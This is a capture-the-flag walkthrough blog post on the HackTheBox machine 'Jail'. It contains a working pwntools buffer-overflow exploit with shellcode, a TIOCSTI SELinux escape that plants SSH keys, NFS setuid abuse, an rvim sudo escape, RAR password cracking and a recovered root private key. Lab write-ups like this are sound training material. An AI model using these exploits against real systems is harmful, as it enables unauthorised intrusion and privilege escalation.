---
layout: post
title: "jail"
date: 2025-10-02 
categories: OSCP Playlist
---
# jail

# Summary

- fuzz to find additional subdir, containing binary that’s operating over port 7411
- the subdir contain the binary, C source code, and the command used to compile
- read source code to understand what binary do; buffer overflow vulnerabilty
- use pwntools to exploit buffer overflow by injecting shellcode on stack; no ASLR protection and Stack is executable mean we can execute shellcode on stack
- shell as nobody as foothold
- showmount to list nfsshare permissions, as no_all_squash is configured, our user maintain the same permissions; write permission over nfsshare
- selinux escape exploit to execute commands as frank; compile C binary that copies our public key over frank’s .ssh dir to get ssh access to frank
- frank has sudo privileges over rvim; escape rvim by using python to spawn a bash shell as adm
- adm home dir contains rar files that contains root public key, and hidden files that reveal password clues to the rar archive
- quipquip to decipher hidden message and create password dictionary to crack rar archive with john
- root public key extracted; used rsactftool wiener attack to generate private key of root
- ssh connect with root private key

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/jail 10.10.10.34

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)
|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)
|_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS)
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp  open  rpcbind 2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
2049/tcp open  nfs     3-4 (RPC #100003)
```

We notice an old version of ssh. Also, NFSv3 relies on client-side user ID (UID)/group ID (GID) mapping, which can be spoofed, making it insecure by default.

Let’s see if there are any accessible nfs shares:

```bash
showmount -e 10.10.10.34

Export list for 10.10.10.34:
/opt          *
/var/nfsshare *

```

Let’s mount both:

```bash
mkdir mnt
cd mnt
mkdir opt 
mkdir nfsshare
sudo mount -t nfs 10.10.10.34:/opt opt -o nolock
sudo mount -t nfs 10.10.10.34:/var var -o nolock

```

In the /opt dir, there is only one file logreader.sh:

```bash
#!/bin/bash
/bin/cat /home/frank/logs/checkproc.log

```

When we try to list the files in nfsshare dir, we get permission deinied:

```bash
ls: cannot open directory '.': Permission denied
```

![image.png]({{ site.baseurl }}/assets/jail/image.png)

Weird. Maybe it has root_squash enabled, therefore sudo don’t work:

![image.png]({{ site.baseurl }}/assets/jail/image%201.png)

However, we see that we have group permission write/execute over nfsshare. Lets’ move on to something else for now.

Let’s try interacting with rpcclient:

```bash
rpcclient -U '' 10.10.10.34

Cannot connect to server.  Error was NT_STATUS_HOST_UNREACHABLE
```

Let’s see what other ports are opened:

```bash
rustscan -a 10.10.10.34 --ulimit 50000

7411/tcp  open  daqstream syn-ack ttl 63
20048/tcp open  mountd    syn-ack ttl 63
```

We find two new ports, 7411 is the aforementioned one; let’s nmap scan them:

```bash
sudo nmap -sV -sC -p 7411,20048 10.10.10.34 -oN nmap/jail2

PORT      STATE SERVICE    VERSION                                                                                                             
7411/tcp  open  daqstream?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, L
DAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, Termina
lServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    OK Ready. Send USER command.
20048/tcp open  mountd     1-3 (RPC #100005)

```

Let’s now visit the web page:

![image.png]({{ site.baseurl }}/assets/jail/image%202.png)

![image.png]({{ site.baseurl }}/assets/jail/image%203.png)

Nothing in page source. Let’s fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.34/FUZZ -ic

jailuser                [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 15ms]
```

We find a subdir. Let’s visit:

![image.png]({{ site.baseurl }}/assets/jail/image%204.png)

![image.png]({{ site.baseurl }}/assets/jail/image%205.png)

We download all the files locally. 

Inspecting compile.sh:

```bash
gcc -o jail jail.c -m32 -z execstack
service jail stop
cp jail /usr/local/bin/jail
service jail start

```

This file compiles the c code in a 32 bit architecture and allow executable stack.

Let’s see what file type jail is:

```bash
file jail      
                                  
jail: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1288d425d0da3a9ecc078ce86c509365e832eb49, not stripped
```

Let’s interact with port 7411:

```bash
nc 10.10.10.34 7411

OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS 1974jailbreak!
OK Authentication success. Send command.
OPEN
OK Jail doors opened. 
```

Let’s inspect the jail.c.
This is a simple TCP server that listens on port **7411**, accepts incoming connections, forks a child to handle each client, and runs a tiny line-based authentication protocol over the socket. The client must send `USER <username>` and `PASS <password>` lines (there’s also a `DEBUG` toggle). If authentication succeeds (the code accepts only username `admin` and password `1974jailbreak!`), the client can then send a final command `OPEN` or `CLOSE`. Output that would normally go to the console (stdout/stderr) is redirected to the client socket so the program’s `printf`s become the protocol replies. 

There is a buffer overflow vulnerability in auth() function.

```python
char userpass[16];
strcpy(userpass, password);

```

`password` originates from the `PASS`  token the client sends and was stored into `password[256]` in `handle()`. If the client supplies a password longer than 15 characters, `strcpy` will copy it into `userpass[16]` and overflow adjacent stack memory. We also see that if we enter DEBUG first as input, the userpass address gets leaked. If the stack is executable, we can just put our shell code after the EIP (which point to our shellcode), and it will be executed. Let’s check whether the stack is executable with checksec:

```python
checksec --file=jail

[*] '/home/kali/htb_labs/jail/jail'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

```

It is. We also notice no PIE, so ASLR is not enabled; address is not randomised at run time.

Let’s start the binary and attach to our process:

```python
#in one terminal
./jail

#in another, attach to process
ps -ef | grep jail
kali       55870    1990  0 11:59 pts/3    00:00:00 ./jail

pwndbg --pid 55870
#since the program forks off a child process for auth, where the buffer overflow is, we want to follow that
#we also don't want the parent process to detach when the child forks off either

set follow-fork-mode child  #should be on by default
set detach-on-fork off

#now let's run the program.
r
```

Once the process is running, we connect to our [localhost](http://localhost) with nc on port 7411:

```python
nc localhost 7411
```

![image.png]({{ site.baseurl }}/assets/jail/image%206.png)

Also, when the program exits, we can reattach back by inferior X (it’s usually 1):

```python
  Num  Description       Connection           Executable        
  1    process 61081     2 (native)           /home/kali/htb_labs/jail/jail 
* 2    <null>                                 /home/kali/htb_labs/jail/jail 

```

Reattach:

```python
inferior 1
#continue
c
```

Now we can run the program again. Let’s find the exact offset to EIP. We can use cyclic from pwndbg. We know the buffer was size 16, so 45 chars should be plenty to overflow the buffer. 

```python
cyclic 45

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaal
```

Now connect again:

```python
nc localhost 7411
DEBUG
USER admin
PASS aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaal
```

We use the regs command to check our stack:

![image.png]({{ site.baseurl }}/assets/jail/image%207.png)

Let’s use cyclic again to find the exact offset to EIP:

```python
cyclic -l haaa

Found at offset 28
```

28 bytes to the instruction pointer. 

Now let’s generate our shell code. We want a x86 reverse shell. Let’s use this socket reuse shellcode from exploitdb

https://www.exploit-db.com/exploits/34060

```python
shellcode[]=
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80";
```

Now, let’s leak the actual address of userpass, since ASLR is not enabled, this will be a constant

```python
nc 10.10.10.34 7411

OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.
USER admin
OK Send PASS command.
PASS aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaal
Debug: userpass buffer @ 0xffffd610
```

Now, our whole payload is:

```python
payload = junk + [userpass_addr+32] + shellcode
```

Let’s use pwntools to write our exploit:

```python
from pwn import *

shellcode = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

payload = "A"*28 + p32(0xffffd630) + shellcode
r = remote('10.10.10.34', 7411)
print r.recvuntil("OK Ready. Send USER command.")
r.sendline('USER admin')
print r.recvuntil("OK Send PASS command.")
r.sendline('PASS ' + payload)
r.interactive()
```

Now let’s execute:

```python
~/.local/share/pipx/venvs/pwntools/bin/python3 exploit.py
```

We now have shell.

![image.png]({{ site.baseurl }}/assets/jail/image%208.png)

The context indicates we are in a SELinux sandbox. Searching up SELinux escape, we get:

[https://seclists.org/oss-sec/2016/q3/606](https://seclists.org/oss-sec/2016/q3/606)

Let’s copy the code and execute:

```python
#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
    char *cmd = "id\n";
    while(*cmd)
     ioctl(0, TIOCSTI, cmd++);
    execlp("/bin/id", "id", NULL);
}
```

Since our shell on the machine is not a proper shell, so we cannot open vim/nano etc., we need another way to transfer our exploit over. We remember that there is an open nfs share. However, we do not have permission to create files, the nfsshare might have root_squash enabled. 

We can check on the shell we have on the target:

```python
cat /etc/exports

/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt *(rw,sync,root_squash,no_all_squash)
```

We also see `no_all_squash` (the **default**) → client UIDs/GIDs are **preserved**.
We remember we do have group write/execute permission over nfsshare. 

```python
sudo mount -t nfs 10.10.10.34:/opt opt -o nolock
sudo mount -t nfs 10.10.10.34:/var var -o nolock

ls -l

drwx-wx--x 2 root kali 75 Oct  2 06:09 nfsshare

```

Now let’s compile and execute the selinux exploit (we have to compile the exploit on an old version of Linux, as the LibC is different; I made this work on Linux remnux 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux):

```python
gcc escape.c -o escape

cp escape var/nfsshare/

chmod 4755 var/nfsshare/escape

#Now we should see the file on target as well
```

On target:

```python
ls -la /var/nfsshare/escape

-rwsr-xr-x. 1 frank frank 14984 Oct  2 02:11 /var/nfsshare/escape
```

Now let’s execute, then check our id again:

```python
/var/nfsshare/escape

uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

We see our euid has changed. Seems like we can execute as frank. Now we can generate a key pair, and put our public key in frank’s .ssh dir, so we get ssh connection. 

```python
#Let's create a ssh key on attack host
ssh-keygen -f frank
cat frank.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICbAxiwc62G0TW5Ifmmtj3MZIKorChDkhlJ9Tsx/Zr1f kali@kali

#Now change our exploit
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICbAxiwc62G0TW5Ifmmtj3MZIKorChDkhlJ9Tsx/Zr1f kali@kali" > authorized_keys

chmod 600 frank #change to secure permission to allow use of private key

```

No change our exploit:

```python
#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
    char *cmd = "id\n";
    while(*cmd)
     ioctl(0, TIOCSTI, cmd++);
    execlp("/bin/cp", "cp", "/var/nfsshare/authorized_keys", "/home/frank/.ssh/authorized_keys", NULL);
}
```

Compile it (again, this is done on an older version of ubuntu)

```python
gcc key_drop.c -o key_drop
```

Now copy the files over to nfsshare and change its permissions:

```python
cp key_drop var/nfsshare/
cp authorized_keys var/nfsshare

chmod 4755 var/nfsshare/key_drop
```

Now let’s execute it:

```python
/var/nfsshare/key_drop
```

Let’s attempt to ssh over now:

```python
ssh -i frank frank@10.10.10.34
```

We are in.

![image.png]({{ site.baseurl }}/assets/jail/image%209.png)

Let’s enumerate our privileges:

```python
id

uid=1000(frank) gid=1000(frank) groups=1000(frank) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

sudo -l

User frank may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh
    (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

We can execute logreader.sh. and rvim as adm. Checking our cron jobs:

```python
crontab -l

*/5 * * * * /home/frank/bin/checkproc.sh
0 0 * * * /bin/echo -n > /home/frank/logs/checkproc.log
```

[checkproc.sh](http://checkproc.sh) is executed every 5 minutes. The echo command is executed every midnight.

Let’s check out logreader.sh:

```python
ls -l /opt/logreader/logreader.sh

-rwxr-x---+ 1 root root 52 Jun 26  2017 /opt/logreader/logreader.sh

cat logreader.sh

#!/bin/bash
/bin/cat /home/frank/logs/checkproc.log

```

Not really interesting. Let’s search up rvim in GTFObin. The logic here is we can spawn a shell.

```python
sudo -u adm /usr/bin/rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

We can break out of the shell:

```python
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

Now, let’s execute the bash command:

```python
:py import pty; pty.spawn("/bin/bash")
```

![image.png]({{ site.baseurl }}/assets/jail/91d35eae-d533-405d-97f4-248a43de807b.png)

We now have shell as adm. Let’s check our sudo privileges:

```python
sudo -l

User adm may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh

```

As adm, we have privileges to read log files. We do not see any log files we have permission to read. Let’s go to our home dir:

```python
bash-4.2$ pwd
/var/adm
bash-4.2$ ls -la
total 4
drwxr-x---.  3 root adm    19 Jul  3  2017 .
drwxr-xr-x. 23 root root 4096 Oct  1 01:46 ..
drwxr-x---.  3 root adm    52 Jul  3  2017 .keys
```

This seems interesting, let’s read it:

```python
bash-4.2$ ls
keys.rar  note.txt
bash-4.2$ cat note.txt
Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
```

Let’s attempt to decompress the rar file:

```python
unrar x keys.rar

UNRAR 5.00 freeware      Copyright (c) 1993-2013 Alexander Roshal

Extracting from keys.rar

Enter password (will not be echoed) for rootauthorizedsshkey.pub: 

Cannot create rootauthorizedsshkey.pub
Permission denied
No files to extract
```

We do not have the password. Find files related to adm

```python
find / -group adm -ls 2>/dev/null
```

We find hidden directories in our home folder, let’s read it:

```python
bash-4.2$ ls
keys.rar  note.txt
bash-4.2$ ls -la
total 8
drwxr-x---. 3 root adm  52 Jul  3  2017 .
drwxr-x---. 3 root adm  19 Jul  3  2017 ..
-rw-r-----. 1 root adm 475 Jul  3  2017 keys.rar
drwxr-x---. 2 root adm  20 Jul  3  2017 .local
-rw-r-----. 1 root adm 154 Jul  3  2017 note.txt
bash-4.2$ cd .local
bash-4.2$ ls
bash-4.2$ ls -la
total 4
drwxr-x---. 2 root adm  20 Jul  3  2017 .
drwxr-x---. 3 root adm  52 Jul  3  2017 ..
-rw-r-----. 1 root adm 113 Jul  3  2017 .frank
bash-4.2$ cat .frank
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!

```

Looks like caesar cipher. Let’s try reading it:

```python
rotations 8:

Ahahah! Utgtej lzww bndpp vj udl shppltqe! Tuwj h cdl wnfxj ptnwp ahmd Dpfhsde cqtv Hwfhoqhi hwzmd wzxd Z eze!!!
```

Ahahaa seems plausible, but the rest is gibberish. We can use a tool quipquip online to crack it:

```python
Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!
```

![image.png]({{ site.baseurl }}/assets/jail/image%2010.png)

Now if we search frank alcatraz on the internet, we find out frank’s last name is morris:

![image.png]({{ site.baseurl }}/assets/jail/image%2011.png)

Let’s try some simple password first. 

```python
Morris1962$
Morris1962!
```

We can use this to try and decompress the rar file:

```python
unrar x keys.rar
```

Worked, but we don’t have permission to write files in that dir. Another way to do this is to create a password dictionary. Let’s copy the file back to our host and attempt to crack it. Since it’s a small file, we can just base64 encode it, then decrypt it on host:

```python
base64 -w0 keys.rar

UmFyIRoHAM+QcwAADQAAAAAAAAALnXQkhEAAgAEAAMMBAAAD7rRLW0tk40odMxgApIEAAHJvb3RhdXRob3JpemVkc3Noa2V5LnB1YnI+qg+QiYZnpO86O3+rX46ki9CMd7+qCC09p9xDL5gF8Wgwc7mZK9wkiTpvXO4vmmM50barFVJi55jD3l9J8var5iMCb8+Lrpn2e79rXFKzktBJ2e3/cSLUZRSv33cQFk2+9b43PDDjUD6IQ6FVbjc72sy6/8bMu7k8MYtJWFRHsLTwIXi0ZMrd/vydVFq7vQiUPYbt7H0SscXY4crEf9ann9iQyl6V034tluMZ9VQ6DmkXk53ekSbb3/Ck5/1hb9qj2RpBQUNTW70fQIbDXjcOp+qKerl8cfpDdo7JDRZbmJBuYd5zgFEASKHrew3spqQ/gZrNO6m/VvI/ZUa6DTmqhguHYKC838c9JzzDmW52daeuPMZtdTz2B0Enz5eBdV2XLbofx6ZA3nIYco6DJMvU9NxOfaLgnTj/JWRVAgUjoEgQUdcyWDEWoDYh+ARbAfG+qyqRhF8ujgUqYWNbXY8FxMsrTPdcWGz8348OZsMWH9NS5S8/KeIoGZU1YhfpP/6so4ihWCnWxD17AEAHAA==

md5sum keys.rar
```

Now back on our host, let’s decrypt it:

```python
echo 'UmFyIRoHAM+QcwAADQAAAAAAAAALnXQkhEAAgAEAAMMBAAAD7rRLW0tk40odMxgApIEAAHJvb3RhdXRob3JpemVkc3Noa2V5LnB1YnI+qg+QiYZnpO86O3+rX46ki9CMd7+qCC09p9xDL5gF8Wgwc7mZK9wkiTpvXO4vmmM50barFVJi55jD3l9J8var5iMCb8+Lrpn2e79rXFKzktBJ2e3/cSLUZRSv33cQFk2+9b43PDDjUD6IQ6FVbjc72sy6/8bMu7k8MYtJWFRHsLTwIXi0ZMrd/vydVFq7vQiUPYbt7H0SscXY4crEf9ann9iQyl6V034tluMZ9VQ6DmkXk53ekSbb3/Ck5/1hb9qj2RpBQUNTW70fQIbDXjcOp+qKerl8cfpDdo7JDRZbmJBuYd5zgFEASKHrew3spqQ/gZrNO6m/VvI/ZUa6DTmqhguHYKC838c9JzzDmW52daeuPMZtdTz2B0Enz5eBdV2XLbofx6ZA3nIYco6DJMvU9NxOfaLgnTj/JWRVAgUjoEgQUdcyWDEWoDYh+ARbAfG+qyqRhF8ujgUqYWNbXY8FxMsrTPdcWGz8348OZsMWH9NS5S8/KeIoGZU1YhfpP/6so4ihWCnWxD17AEAHAA==' | base64 -d > keys.rar

#verify it
file keys.rar
keys.rar: RAR archive data, v4, os: Unix

md5sum keys.rar
```

![image.png]({{ site.baseurl }}/assets/jail/image%2012.png)

Let’s create a password dictionary using hashcat:

```python
hashcat -a 3 Morris1962?s --stdout > frank.pass

#If we are unsure about the 4 digit numbers, we can also do
hashcat -a 3 Morris?d?d?d?d?s --stdout > frank.pass
```

Let’s now convert the rar file to john hash format to crack:

```python
rar2john keys.rar > keys.hash
```

Now let’s crack it with hashcat; looking at the hash, it looks like rar3-compressed:

![image.png]({{ site.baseurl }}/assets/jail/image%2013.png)

```python
.\run\john.exe --wordlist=..\pass.txt ..\hashes.txt

Morris1962!      (keys.rar)
```

Now let’s extract it:

```python
unrar x keys.rar
```

Now we have the public key of root. We can use a tool called [rsactftool.py](http://rsactftool.py) to try and recover the private key. 

`rsactftool.py` is a small toolkit used in CTFs and research to run **RSA attacks** automatically against a public key. It typically:

- Loads a public key (PEM / modulus `n` and public exponent `e`).
- Runs a battery of known cryptanalytic checks/attacks: Wiener (small `d`), common-prime / shared-factor tests, low-exponent attacks, small roots (Boneh–Durfee / Coppersmith) heuristics, etc.
- For each candidate attack it tries to recover the private key (values `d`, `p`, `q`) and if successful it will often output a reconstructed private key (PEM) or at least the plaintext / flag.

The Wiener attack recovers the RSA private exponent `d` when `d` is *unusually small*. It uses continued fractions to find rational approximations of `e/n` whose convergents give candidate fractions `k/d` that can reveal `d`. If `d < n^{1/4}/3` (Wiener’s bound, rough statement), the attack will reliably find `d`.

Why continued fractions? Because `e/n ≈ k/d` for some small integers `k,d` when `ed ≡ 1 (mod φ(n))`. Continued fractions give the best rational approximations to a real number — so one of the convergents of `e/n` will (in vulnerable cases) equal or approximate `k/d` and allow you to test candidate `d`.

```python
virtualenv venv
source venv/bin/activate
pip install git+https://github.com/RsaCtfTool/RsaCtfTool
```

```python
RsaCtfTool --publickey rootauthorizedsshkey.pub --attack wiener --private 

[*] Testing key rootauthorizedsshkey.pub.
[*] Performing wiener attack on rootauthorizedsshkey.pub.
 24%|█████████████████▉                                                          | 144/611 [00:00<00:00, 740171.29it/s]
[*] Attack success with wiener method !

Results for rootauthorizedsshkey.pub:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//DmcIo1pJGKy8LDrwdpsSjVmvSgg3
9nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6PdD/qlaFM8B87MHZlW1fqe6QKBgQVY
7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/wWt2/7A1Xgi5ckTFMG5EXhfv67GfC
FE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAxI85LArqOGc6QoVPS7jx5h5bK/3Oq
m3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFuga99GCwIgCMdb8cTpq+uOUyIK2Jrg
PNxrCGF8HNhw8qT9jCez3aMCQQHBKGne1ibAwbqvPTd91cBUKfFYYIAY9a6/Iy56
XnGBS35kpKZB7j5dMZxxOwPDowgZr9aGNAzcFAeCaP5jj3DhAkEDb4p9D5gqgSOc
NXdU4KxzvZeBQn3IUyDbJ0J4pniHZzrYq9c6MiT1Z9KHfMkYGozyMd16Qyx4/Isf
bc51aYmHCQIgCMdb8cTpq+uOUyIK2JrgPNxrCGF8HNhw8qT9jCez3aMCIAjHW/HE
6avrjlMiCtia4DzcawhhfBzYcPKk/Ywns92jAkEBZ7eXqfWhxUbK7HsKf9IkmRRi
hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
-----END RSA PRIVATE KEY-----
```

Let’s save that to a file, change the file permission and attempt to ssh as root:

```python
chmod 600 root.key

ssh -i root.key root@10.10.10.34
#we need to downgrade our ssh

ssh -i root.key -o PubkeyAcceptedKeyTypes=+ssh-rsa root@10.10.10.34
```

We are now root:

![image.png]({{ site.baseurl }}/assets/jail/image%2014.png)